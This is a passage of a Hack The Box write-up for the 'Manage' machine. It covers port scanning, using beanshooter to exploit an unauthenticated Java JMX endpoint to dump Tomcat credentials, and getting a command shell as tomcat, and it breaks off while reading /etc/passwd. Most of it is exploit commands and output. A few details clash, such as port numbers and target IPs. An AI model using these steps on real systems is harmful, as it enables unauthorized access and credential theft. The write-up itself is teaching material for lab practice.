---
layout: post
title: "[HTB] Manage"
description: "[Machine] - Easy difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---

![](/img/htb_img/Manage_img/img1.png)

- OS: Linux
- Release Date: 29 Jul 2025
- Difficulty: Easy

<br>
<br>

# Enumeration
I always begin by enumerating every TCP port to catch anything that isn’t on the “usual suspects” list:

## Nmap recon
```bash
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 23:36 CEST
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 75.05% done; ETC: 23:36 (0:00:03 remaining)
Nmap scan report for 10.129.113.154
Host is up (0.10s latency).
Not shown: 64558 closed tcp ports (reset), 972 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
33141/tcp open  unknown
45501/tcp open  unknown
```
Results showed five open ports: `22` (SSH), `8080` (HTTP / Tomcat), and three less common ones, two of which identified as Java RMI endpoints. That immediately pointed to a Java stack that might expose management surfaces (JMX over RMI) in addition to the Tomcat web UI.

Scripts and versions.
```sh
❯ extractPorts allports
───────┬────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.129.113.154
   5   │     [*] Open ports: 22,2222,8080,33141,45501
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────
❯ nmap -p22,2222,8080,33141,45501 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 23:39 CEST
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.86% done; ETC: 23:40 (0:00:00 remaining)
Nmap scan report for 10.129.113.154
Host is up (0.10s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp  open  java-rmi   Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:33141
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8080/tcp  open  http       Apache Tomcat 10.1.19
|_http-title: Apache Tomcat/10.1.19
|_http-favicon: Apache Tomcat
33141/tcp open  java-rmi   Java RMI
45501/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.96 seconds
```

Key takeaways:
- `8080/tcp` → Apache Tomcat 10.1.x serving the default site.
- `2222/tcp` & `41557/tcp` → Java RMI; one of them announced `jmxrmi`, which is how Tomcat/JVM typically exposes JMX.
- SSH looked like stock Ubuntu.

<br>

## TCP 8080: Web enumeration
![](/img/htb_img/Manage_img/img2.png)
Hitting `http://<ip>:8080/` returned the default Tomcat splash page. Links to `/manager`, `/manager/html`, `/host-manager`, and `/manager/status` were present but returned 403 (expected when Manager apps exist but are restricted).

I brute-forced paths to establish what was exposed and to learn the site’s “404 shape”:
```bash
❯ feroxbuster -u http://$target:8080 -t 50 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
                                                                                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.113.154:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       68w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/RELEASE-NOTES.txt
200      GET      398l      788w     5584c http://10.129.113.154:8080/tomcat.css
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/api/index.html
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/cluster-howto.html
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/deployer-howto.html
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/config
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/jndi-datasource-examples-howto.html
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/appdev
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/realm-howto.html
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/changelog.html
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/manager-howto.html
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/setup.html
403      GET       27l       89w      877c http://10.129.113.154:8080/docs/security-howto.html
403      GET       73l      389w     3022c http://10.129.113.154:8080/host-manager/html
403      GET       83l      433w     3446c http://10.129.113.154:8080/manager/html
403      GET       83l      433w     3446c http://10.129.113.154:8080/manager/status
302      GET        0l        0w        0c http://10.129.113.154:8080/docs => http://10.129.113.154:8080/docs/
200      GET       22l       93w    42556c http://10.129.113.154:8080/favicon.ico
403      GET       27l       89w      877c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      967l     1204w    67795c http://10.129.113.154:8080/tomcat.svg
200      GET      198l      490w    11219c http://10.129.113.154:8080/
403      GET       73l      389w     3022c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       27l       89w      865c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       83l      433w     3446c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.129.113.154:8080/manager => http://10.129.113.154:8080/manager/
302      GET        0l        0w        0c http://10.129.113.154:8080/examples => http://10.129.113.154:8080/examples/
```

No juicy custom apps turned up-just Tomcat defaults and Manager endpoints behind access control. That nudged me back to the RMI/JMX surface for a potential foothold.

<br>

# Foothold
## JMX Enumeration
Tomcat and the underlying JVM can expose a JMX MBean server over RMI. If it’s reachable and not locked down, an attacker can:
- Query MBeans for configuration (sometimes including credentials),
- Load malicious MBeans to execute arbitrary commands.

### Beanshooter survey
I used **beanshooter** to enumerate the remote MBean server over RMI:
```
# Download beanshooter
wget https://github.com/qtc-de/beanshooter/releases/download/v4.1.0/beanshooter-4.1.0-jar-with-dependencies.jar
```

```bash
❯ java -jar /opt/beanshooter-4.1.0-jar-with-dependencies.jar enum $target 2222
[+] Checking available bound names:
[+]
[+] 	* jmxrmi (JMX endpoint: 127.0.1.1:35637)
[+]
[+] Checking for unauthorized access:
[+]
[+] 	- Remote MBean server does not require authentication.
[+] 	 Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- Remote MBeanServer rejected the payload class.
[+] 	 Vulnerability Status: Non Vulnerable
[+]
[+] Checking available MBeans:
[+]
[+] 	- 158 MBeans are currently registred on the MBean server.
[+] 	 Listing 136 non default MBeans:
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=numberwriter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/host-manager)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HostManager,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=RemoteAddrValve)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=GlobalRequestProcessor,name="http-nio-8080")
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=default,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="role1",database=UserDatabase)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/manager)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/manager)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=SessionExample,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/host-manager,name=Cache)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestHeaderExample,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=name3)
[+] 	 - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/examples)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/examples,name=Cache)
[+] 	 - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=stock,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=StandardContextValve)
[+] 	 - org.apache.catalina.mbeans.ServiceMBean (Catalina:type=Service)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/name1)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=NonLoginAuthenticator)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=ServletToJsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=StandardContextValve)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HTMLHostManager,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/manager,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/docs,name=RemoteAddrValve)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async1,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=default,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async0,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Realm,realmPath=/realm0)
[+] 	 - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/docs,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async3,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=async2,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/manager)
[+] 	 - jdk.management.jfr.FlightRecorderMXBeanImpl (jdk.management.jfr:type=FlightRecorder) (action: recorder)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Deployer,host=localhost)
[+] 	 - org.apache.catalina.mbeans.ContextResourceMBean (Catalina:type=Resource,resourcetype=Global,class=org.apache.catalina.UserDatabase,name="UserDatabase")
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=Manager,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/examples)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/host-manager)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=BasicAuthenticator)
[+] 	 - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=minExemptions)
[+] 	 - org.apache.catalina.mbeans.MemoryUserDatabaseMBean (Users:type=UserDatabase,database=UserDatabase) (action: tomcat)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Timing Filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/docs)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=UtilityExecutor)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=StringCache)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/,name=default,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=simpleimagepush,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=CompressionFilterTestServlet,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ConnectorMBean (Catalina:type=Connector,port=8080)
[+] 	 - org.apache.catalina.mbeans.UserMBean (Users:type=User,username="admin",database=UserDatabase)
[+] 	 - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="manage-gui",database=UserDatabase)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/host-manager)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=CSRF,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/manager,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=ErrorReportValve)
[+] 	 - org.apache.catalina.mbeans.ClassNameMBean (Catalina:type=ThreadPool,name="http-nio-8080")
[+] 	 - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/examples)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:type=Host,host=localhost)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/host-manager,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/manager,name=CSRF,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:type=Engine)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/docs,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=FormAuthenticator)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=default,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=BasicAuthenticator)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=StandardContextValve)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/docs,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=AccessLogValve)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/manager)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/manager,name=Cache)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/docs,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Request Dumper Filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Mapper)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestParamExample,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.RoleMBean (Users:type=Role,rolename="admin-gui",database=UserDatabase)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/examples)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/host-manager)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=StandardHostValve)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/host-manager,name=RemoteAddrValve)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Realm,realmPath=/realm0/realm0)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=HTTP header security filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/docs)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/,name=Cache)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=JspMonitor,WebModule=//localhost/examples,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/examples,name=RemoteAddrValve)
[+] 	 - com.sun.management.internal.HotSpotDiagnostic (com.sun.management:type=HotSpotDiagnostic) (action: hotspot)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=MBeanFactory)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=SocketProperties,name="http-nio-8080")
[+] 	 - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ProtocolHandler,port=8080)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,name=StandardEngineValve)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/docs)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=bytecounter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/docs,name=Cache)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/docs)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=CookieExample,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/examples,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=HelloWorldExample,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=RequestInfoExample,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Manager,host=localhost,context=/manager)
[+] 	 - org.apache.catalina.mbeans.ContextMBean (Catalina:j2eeType=WebModule,name=//localhost/host-manager,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Server)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=WebResourceRoot,host=localhost,context=/)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/manager,name=StandardContextValve)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/examples)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=jsp,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/,name=StandardContextValve)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/docs,name=default,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/examples,name=Compression Filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,context=/,name=NonLoginAuthenticator)
[+] 	 - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/docs)
[+] 	 - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/name4)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=Status,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.UserMBean (Users:type=User,username="manager",database=UserDatabase)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=responsetrailer,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=JMXProxy,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=HTMLManager,J2EEApplication=none,J2EEServer=none)
[+] 	 - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/)
[+] 	 - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/bar/name2)
[+] 	 - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:type=DiagnosticCommand) (action: diagnostic)
[+]
[+] Enumerating tomcat users:
[+]
[+] 	- Listing 2 tomcat users:
[+]
[+] 		----------------------------------------
[+] 		Username:  manager
[+] 		Password:  fhErvo2r9wuTEYiYgt
[+] 		Roles:
[+] 			  Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+] 		----------------------------------------
[+] 		Username:  admin
[+] 		Password:  onyRPCkaG4iX72BrRtKgbszd
[+] 		Roles:
[+] 			  Users:type=Role,rolename="role1",database=UserDatabase
```

This did useful things:
1. Showed bond to port 41557
2. Confirmed an unauthenticated JMX endpoint.
3. Enumerated MBeans and dumped Tomcat user accounts from the in-memory `UserDatabase`, revealing two usernames with plaintext passwords (e.g., `manager`, `admin`) and their roles. Even if Manager UI is behind 403, knowing real credentials is gold for later pivoting.

<br>

## Obtaining RCE
Beanshooter can bootstrap execution by abusing `StandardMBean` to load its **TonkaBean** helper, then offering an interactive “exec” shell.
Deploy the primitive:
```bash
❯ java -jar /opt/beanshooter-4.1.0-jar-with-dependencies.jar standard $target 2222 tonka
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+]
[+] 	Deplyoing MBean: StandardMBean
[+] 	MBean with object name de.qtc.beanshooter:standard=5663340312371 was successfully deployed.
[+]
[+] 	Caught NullPointerException while invoking the newTransformer action.
[+] 	This is expected bahavior and the attack most likely worked :)
[+]
[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=5663340312371 from the MBeanServer.
[+] 	MBean was successfully removed.
```

<br>

### Tonka Shell as Tomcat
Spawn the Tonka Shell:
```bash
❯ java -jar /opt/beanshooter-4.1.0-jar-with-dependencies.jar tonka shell $target 2222
[tomcat@10.129.234.57 /]$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
[tomcat@10.129.234.57 /]$
```

Achieved a reverse shell.

#### User flag
We can check the home directory of tomcat reading the `/etc/passwd` file:
```
[tomcat@10.129.234.57 /home]$ [tomcat@10.129.234.57 /home]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
